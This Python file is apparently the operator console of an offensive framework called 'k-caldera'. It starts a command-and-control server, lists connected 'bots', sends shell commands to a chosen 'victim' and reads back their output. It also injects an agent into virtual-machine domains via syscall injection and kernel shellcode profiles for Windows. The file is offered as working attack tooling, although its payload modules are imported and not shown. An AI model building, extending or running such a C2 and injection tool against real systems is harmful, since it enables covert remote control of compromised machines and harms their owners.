from vm_drivers import list_domains, inject_domain, InvalidDomain, InvalidSyscall
from config.conf_manager import read_config, pretty_print_config
from c2.c2_server import start_multithreaded_c2, list_c2_connections, send_c2_command, read_c2_log, InvalidConnUUID, NotAliveConnection
import datetime


changeable = ['win_major_version', 'win_minor_version', 'first_stage_profile', 'second_stage_profile']


def c2read(_config, _offsets, _args):
    if len(_args) > 0:
        conn_uuid = _args[0]
        try:
            if len(_args) > 1:
                index = _args[1]
                data = read_c2_log(conn_uuid, index)
            else:
                data = read_c2_log(conn_uuid)
            print(data)
        except InvalidConnUUID:
            print("Invalid connection UUID")
    else:
        print("You must provide 'conn_uuid' argument, and optionally the command index")


def c2send(_config, _offsets, _args):
    if len(_args) > 1:
        conn_uuid = _args[0]
        cmd = " ".join(_args[1:])
        try:
            send_c2_command(conn_uuid, cmd)
        except InvalidConnUUID:
            print("Invalid connection UUID")
        except NotAliveConnection:
            print("Can't send commands to dead bots")
    else:
        print("You must provide 'conn_uuid' argument and at least one command argument to send")


def c2list(_config, _offsets, _args):
    conn_tuples = list_c2_connections()
    print("Connection UUID\tClient address\tLast seen\tIs Alive\tNumber of commands".expandtabs(40))
    for conn in conn_tuples:
        last_seen = datetime.datetime.fromtimestamp(conn[2]).ctime()
        new_conn = '\t'.join((conn[0], str(conn[1]), last_seen, 'Yes' if conn[3] else 'No', str(conn[4])))
        new_conn = new_conn.expandtabs(40)
        print(new_conn)


def dominject(_config, _offsets, _args):
    if len(_args) > 0:
        domain = _args[0]
        try:
            inject_domain(domain, _config, _offsets)
        except InvalidDomain:
            print("Invalid domain")
        except InvalidSyscall:
            print("Syscall injection point not found")
        except NotImplementedError:
            print("Error: you selected a shellcode profile or a Windows major version that wasn't implemented")
    else:
        print("You must provide 'domain' argument")


def domlist(_config, _offsets, _args):
    domains = list_domains(_config)
    print(", ".join(domains))


def showconf(_config, _offsets, _args):
    pretty_print_config(_config)


def modconf(_config, _offsets, _args):
    if len(_args) > 1:
        conf_parameter = _args[0]
        new_value = _args[1]
        if conf_parameter not in changeable:
            print(f'conf_parameter must be in: {", ".join(changeable)}')
        else:
            print(f'Old value: {_config[conf_parameter]}')
            if isinstance(_config[conf_parameter], int):
                try:
                    _config[conf_parameter] = int(new_value)
                except ValueError:
                    print(f"Invalid value for {conf_parameter}")
            else:
                _config[conf_parameter] = new_value
            print('New configuration:')
            showconf(_config, _offsets, _args)
    else:
        print("You must provide 'conf_parameter' and 'new_value' arguments")


def command_line_interface(_config, _offsets, stream_req_handler=None):
    options = ["domlist", "dominject", "c2list", "c2send", "c2read", "showconf", "modconf",
               "quit", "help", "info"]
    funcs = {'domlist': domlist, 'dominject': dominject, 'c2list': c2list, 'c2send': c2send,
             'c2read': c2read, 'showconf': showconf, 'modconf': modconf}
    infos = {'domlist': 'Usage: domlist\nList available domains',
             'dominject': 'Usage: dominject <domain>\nInject agent into domain',
             'c2list': 'Usage: c2list\nList all connections to C2 server',
             'c2send': 'Usage: c2send <conn_uuid> <cmd_arg0> ... <cmd_argN>\nSend command to specified victim',
             'c2read': 'Usage: c2read <conn_uuid> [cmd_index]\n'
                       'Read data received upon connection if no cmd_index is specified, otherwise read '
                       'command and command output of index specified',
             'showconf': 'Usage: showconf\nShow configuration',
             'modconf': 'Usage: modconf <conf_parameter> <new_value>\nChange value of specified parameter\n'
                        f'Changeable values: {", ".join(changeable)}\n'
                        'Other parameters have to be tuned before bootstrap',
             'quit': 'Usage: quit\nExit this interface and shut down C2 server',
             'help': 'Usage: help\nShow available options',
             'info': 'Usage: info <option>\nShow option usage and brief description'}
    while True:
        print("k-caldera> ", end="")
        choice = input().strip()
        if choice == 'help':
            print(f"Available commands: {', '.join(options)}")
        elif choice == 'quit':
            break
        else:
            choice = choice.split(' ')
            option = choice[0]
            if option == 'info':
                if len(choice) < 2:
                    print("You must provide exactly one argument to 'info' option")
                else:
                    req_info = choice[1]
                    if req_info not in infos:
                        print("Requested info for invalid option")
                    else:
                        print(infos[req_info])
            elif option not in funcs:
                print("Invalid command")
            else:
                funcs[option](_config, _offsets, choice[1:])


def start_c2(_config):
    print('[+] Starting C2 Server')
    _server = start_multithreaded_c2(_config)
    print('[+] Done')
    return _server


def stop_c2(_server):
    print('[+] Starting C2 Server')
    _server.shutdown()
    print('[+] Done')


if __name__ == "__main__":
    config = read_config('/usr/src/app/config/config.json')
    offsets = read_config('/usr/src/app/kernel_shellcode_library/offsets.json')
    server = start_c2(config)
    command_line_interface(config, offsets)
    stop_c2(server)
